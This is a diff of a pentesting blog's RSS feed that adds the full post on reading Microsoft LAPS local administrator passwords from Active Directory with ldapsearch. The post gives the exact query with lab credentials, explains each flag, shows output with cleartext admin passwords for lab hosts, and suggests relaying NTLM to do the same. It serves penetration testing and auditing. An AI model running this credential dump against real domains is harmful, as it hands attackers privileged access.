@@ -8,7 +8,7 @@
     <language>en-us</language>
     <lastBuildDate>Mon, 24 Jul 2017 07:35:28 -0500</lastBuildDate>
     
-	<atom:link href="https://malicious.link/tags/ldapsearch/index.xml" rel="self" type="application/rss+xml" />
+        <atom:link href="https://malicious.link/tags/ldapsearch/index.xml" rel="self" type="application/rss+xml" />
     
     
     <item>
@@ -17,11 +17,95 @@
       <pubDate>Mon, 24 Jul 2017 07:35:28 -0500</pubDate>
       
       <guid>https://malicious.link/post/2017/dump-laps-passwords-with-ldapsearch/</guid>
-      <description>If you&amp;rsquo;ve ever been pentesting an organization that had LAPS, you know that it is the best solution for randomizing local administrator passwords on the planet. (You should just be leaving them disabled).
-LAPS stores it&amp;rsquo;s information in Active Directory:
- The expiration time: ms-Mcs-AdmPwdExpirationTime: 131461867015760024
- And the actual password in clear text: ms-Mcs-AdmPwd: %v!e#7S#{s})+y2yS#(
-  When LAPS first came it, any user in Active Directory could read it.</description>
+      <description>&lt;p&gt;&lt;img src=&#34;https://malicious.link/images/2017/ldapsearch_laps_rights.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;If you&amp;rsquo;ve ever been pentesting an organization that had LAPS, you know that it is the best solution for randomizing local administrator passwords on the planet. (You should just be leaving them disabled).&lt;/p&gt;
+
+&lt;p&gt;LAPS stores it&amp;rsquo;s information in Active Directory:&lt;/p&gt;
+
+&lt;ul&gt;
+&lt;li&gt;&lt;p&gt;The expiration time: &lt;code&gt;ms-Mcs-AdmPwdExpirationTime: 131461867015760024&lt;/code&gt;&lt;/p&gt;&lt;/li&gt;
+
+&lt;li&gt;&lt;p&gt;And the actual password in clear text: &lt;code&gt;ms-Mcs-AdmPwd: %v!e#7S#{s})+y2yS#(&lt;/code&gt;&lt;/p&gt;&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;When LAPS first came it, any user in Active Directory could read it. Microsoft fixed that, you now have to have the &lt;code&gt;All extended rights&lt;/code&gt; permission to the object or Full Control of it.&lt;/p&gt;
+
+&lt;p&gt;In many organizations, there are pockets of &lt;strong&gt;OU&lt;/strong&gt; admins, or even standard users that are in charge of a specific set of Users and (in particular) computers in which they have full control over.&lt;/p&gt;
+
+&lt;p&gt;There is already a Metasploit module thanks to &lt;a href=&#34;https://github.com/Meatballs1&#34;&gt;Meatballs&lt;/a&gt;:
+&lt;a href=&#34;https://github.com/rapid7/metasploit-framework/blob/master/modules/post/windows/gather/credentials/enum_laps.rb&#34;&gt;https://github.com/rapid7/metasploit-framework/blob/master/modules/post/windows/gather/credentials/enum_laps.rb&lt;/a&gt;. But, unfortunately I don&amp;rsquo;t always have access to a Meterpreter session to run the module.&lt;/p&gt;
+
+&lt;p&gt;Using &lt;code&gt;ldapsearch&lt;/code&gt; (which is included in the package &lt;code&gt;ldapscripts&lt;/code&gt; on Debian/Ubuntu) can be used to make the same query that the module does. Here is an example run:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;ldapsearch -x -h 192.168.80.10 -D \
+&amp;quot;helpdesk&amp;quot; -w ASDqwe123 -b &amp;quot;dc=sittingduck,dc=info&amp;quot; \
+&amp;quot;(ms-MCS-AdmPwd=*)&amp;quot; ms-MCS-AdmPwd
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Lets break this down:&lt;/p&gt;
+
+&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;-x&lt;/code&gt; - Use basic authentication&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;-h 192.168.80.10&lt;/code&gt; - Connect to the Domain Controller for ldap&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;-D &amp;quot;helpdesk&amp;quot; -w ASDqwe123&lt;/code&gt; - Login as the &lt;code&gt;helpdesk&lt;/code&gt; user, with the password &lt;code&gt;ASDqwe123&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;-b &amp;quot;dc=sittingduck,dc=info&amp;quot;&lt;/code&gt; - This loads the base LDAP object of the entire domain.&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;&amp;quot;(ms-MCS-AdmPwd=*)&amp;quot;&lt;/code&gt; - Filter out any objects that I can&amp;rsquo;t see a value for &lt;code&gt;ms-MCS-AdmPwd&lt;/code&gt; for. (If you have rights as that user to see even one Administrator password, this will show it.)&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;ms-MCS-AdmPwd&lt;/code&gt; - Only show me the &lt;code&gt;ms-MCS-AdmPwd&lt;/code&gt; object (which by default includes the object name and DN so you will still know what host it belongs to)&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;What does that look like?&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;$ ldapsearch -x -h 192.168.80.10 -D &amp;quot;helpdesk&amp;quot; -w ASDqwe123 -b &amp;quot;dc=sittingduck,dc=info&amp;quot; &amp;quot;(ms-MCS-AdmPwd=*)&amp;quot; ms-MCS-AdmPwd
+# extended LDIF
+#
+# LDAPv3
+# base &amp;lt;dc=sittingduck,dc=info&amp;gt; with scope subtree
+# filter: (ms-MCS-AdmPwd=*)
+# requesting: ms-MCS-AdmPwd
+#
+
+# DC1, Domain Controllers, sittingduck.info
+dn: CN=DC1,OU=Domain Controllers,DC=sittingduck,DC=info
+ms-Mcs-AdmPwd: 2F1i/++N0H+G]{Y&amp;amp;,F
+
+# SDCLIENT_DAWIN7, LabComputers, Lab, sittingduck.info
+dn: CN=SDCLIENT_DAWIN7,OU=LabComputers,OU=Lab,DC=sittingduck,DC=info
+ms-Mcs-AdmPwd: 8CDR4,2UE8BA{zw2@RR
+
+# SD_WSUS_2012, LabComputers, Lab, sittingduck.info
+dn: CN=SD_WSUS_2012,OU=LabComputers,OU=Lab,DC=sittingduck,DC=info
+ms-Mcs-AdmPwd: +3!UY5@g9B.64RV2z/T
+
+# WIN-PM0ID6F0AHN, LabComputers, Lab, sittingduck.info
+dn: CN=WIN-PM0ID6F0AHN,OU=LabComputers,OU=Lab,DC=sittingduck,DC=info
+ms-Mcs-AdmPwd: %v!e#7S#{s})+y2yS#(
+
+# search reference
+ref: ldap://research.sittingduck.info/DC=research,DC=sittingduck,DC=info
+
+# search reference
+ref: ldap://ForestDnsZones.sittingduck.info/DC=ForestDnsZones,DC=sittingduck,D
+ C=info
+
+# search reference
+ref: ldap://DomainDnsZones.sittingduck.info/DC=DomainDnsZones,DC=sittingduck,D
+ C=info
+
+# search reference
+ref: ldap://sittingduck.info/CN=Configuration,DC=sittingduck,DC=info
+
+# search result
+search: 2
+result: 0 Success
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Now, just having the local admin password doesn&amp;rsquo;t ensure that it&amp;rsquo;s enabled, but there is a good bet that you are good to go now.&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;P.S.&lt;/strong&gt; You can also authenticate using Kerberos (think Golden/Silver tickets)&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;P.P.S&lt;/strong&gt; Because Windows doesn&amp;rsquo;t (to the best of my knowledge) require signing on Domain Controllers for LDAP connections yet (probably does in 2016 or will soon), with a little bit of coding you can get &lt;a href=&#34;https://github.com/CoreSecurity/impacket/blob/master/examples/ntlmrelayx.py&#34;&gt;ntlmrelayx&lt;/a&gt; to dump LAPS passwords ;-)&lt;/p&gt;
+</description>
     </item>
     
   </channel>
